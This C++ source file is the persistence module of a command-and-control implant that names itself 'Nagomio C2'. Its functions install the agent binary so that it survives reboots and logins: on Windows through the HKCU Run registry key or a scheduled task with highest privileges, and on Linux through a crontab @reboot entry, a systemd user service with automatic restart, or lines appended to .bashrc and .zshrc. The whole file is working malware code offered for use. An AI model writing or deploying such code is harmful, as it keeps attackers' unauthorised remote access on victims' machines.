// persist module (B6).
//
// arguments[0] = strategy
//   "registry"      (Windows) — Run key under HKCU
//   "schtasks"      (Windows) — schtasks /Create
//   "crontab"       (Linux)   — /var/spool/cron/<user>
//   "systemd-user"  (Linux)   — ~/.config/systemd/user/nagomio.service
//   "shell-profile" (Linux)   — append to ~/.bashrc / ~/.zshrc
// arguments[1] = binary path (defaults to argv[0])
// arguments[2] = label (default "NagomioAgent")

#include "../json.hpp"
#include "../protocol.h"

#include <cstdlib>
#include <cstring>
#include <fstream>
#include <stdexcept>
#include <string>

#ifdef _WIN32
#include <windows.h>
#else
#include <pwd.h>
#include <sys/stat.h>
#include <unistd.h>
#endif

namespace {

std::string get_self_path() {
#ifdef _WIN32
    char buf[MAX_PATH] = {};
    DWORD n = GetModuleFileNameA(nullptr, buf, sizeof(buf));
    return n ? std::string(buf, n) : std::string();
#else
    char buf[4096] = {};
    ssize_t n = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (n > 0) buf[n] = '\0';
    return n > 0 ? std::string(buf) : std::string();
#endif
}

std::string get_username() {
#ifdef _WIN32
    char buf[256] = {};
    DWORD size = sizeof(buf);
    if (GetUserNameA(buf, &size)) return std::string(buf, size);
    return std::string("SYSTEM");
#else
    if (const char* u = getenv("USER")) return u;
    struct passwd* p = getpwuid(getuid());
    return p ? std::string(p->pw_name) : std::string("root");
#endif
}

} // namespace

#ifdef _WIN32

namespace nagomio_modules {

std::string handle_persist(const std::vector<std::string>& args,
                           const std::string& agent_id) {
    std::string strategy = args.empty() ? "registry" : args[0];
    std::string bin = args.size() > 1 ? args[1] : get_self_path();
    std::string label = args.size() > 2 ? args[2] : "NagomioAgent";

    if (strategy == "registry") {
        HKEY hkey = nullptr;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
                          "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                          0, KEY_SET_VALUE, &hkey) != ERROR_SUCCESS) {
            return std::string(R"({"error":"RegOpenKeyEx failed"})");
        }
        std::string value = "\"" + bin + "\"";
        LONG rc = RegSetValueExA(hkey, label.c_str(), 0, REG_SZ,
                                 reinterpret_cast<const BYTE*>(value.c_str()),
                                 static_cast<DWORD>(value.size() + 1));
        RegCloseKey(hkey);
        if (rc != ERROR_SUCCESS) {
            return std::string(R"({"error":"RegSetValueEx failed"})");
        }
        nlohmann::json j = {
            {"strategy", "registry"},
            {"bin", bin},
            {"label", label},
        };
        return j.dump();
    } else if (strategy == "schtasks") {
        std::string cmd = "schtasks /Create /TN \"" + label + "\" /TR \"" + bin +
                          "\" /SC ONLOGON /RL HIGHEST /F";
        STARTUPINFOA si{}; si.cb = sizeof(si);
        PROCESS_INFORMATION pi{};
        if (!CreateProcessA(nullptr, cmd.data(), nullptr, nullptr, FALSE,
                            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            return std::string(R"({"error":"CreateProcessA failed"})");
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD exit_code = 0;
        GetExitCodeProcess(pi.hProcess, &exit_code);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        nlohmann::json j = {
            {"strategy", "schtasks"},
            {"exit_code", exit_code},
            {"bin", bin},
        };
        return j.dump();
    }
    nlohmann::json j = {{"error", "unknown strategy"}, {"strategy", strategy}};
    return j.dump();
}

} // namespace nagomio_modules

#else

namespace nagomio_modules {

std::string handle_persist(const std::vector<std::string>& args,
                           const std::string& agent_id) {
    std::string strategy = args.empty() ? "shell-profile" : args[0];
    std::string bin = args.size() > 1 ? args[1] : get_self_path();
    std::string user = get_username();
    std::string home = []() {
        if (const char* h = getenv("HOME")) return std::string(h);
        return std::string("/root");
    }();

    if (strategy == "crontab") {
        std::string path = "/var/spool/cron/" + user;
        std::ofstream out(path, std::ios::app);
        if (!out) {
            return std::string(R"({"error":"cannot open crontab"})");
        }
        out << "@reboot " << bin << " &\n";
        out.close();
        chmod(path.c_str(), 0600);
        nlohmann::json j = {
            {"strategy", "crontab"},
            {"path", path},
            {"bin", bin},
        };
        return j.dump();
    } else if (strategy == "systemd-user") {
        std::string dir = home + "/.config/systemd/user";
        std::string svc = dir + "/nagomio.service";
        mkdir(dir.c_str(), 0700);
        std::ofstream out(svc);
        if (!out) return std::string(R"({"error":"cannot open service file"})");
        out << "[Unit]\nDescription=Nagomio C2\n";
        out << "[Service]\nExecStart=" << bin << "\nRestart=always\n";
        out << "[Install]\nWantedBy=default.target\n";
        out.close();
        // Best-effort enablement; ignore failures.
        system("systemctl --user enable nagomio.service 2>/dev/null");
        nlohmann::json j = {
            {"strategy", "systemd-user"},
            {"path", svc},
        };
        return j.dump();
    } else if (strategy == "shell-profile") {
        std::vector<std::string> files = {home + "/.bashrc", home + "/.zshrc"};
        for (auto& f : files) {
            std::ofstream out(f, std::ios::app);
            if (!out) continue;
            out << "\n# Nagomio C2\nnohup " << bin << " >/dev/null 2>&1 &\n";
        }
        nlohmann::json j = {
            {"strategy", "shell-profile"},
            {"files", files},
        };
        return j.dump();
    }
    nlohmann::json j = {{"error", "unknown strategy"}, {"strategy", strategy}};
    return j.dump();
}

} // namespace nagomio_modules

#endif
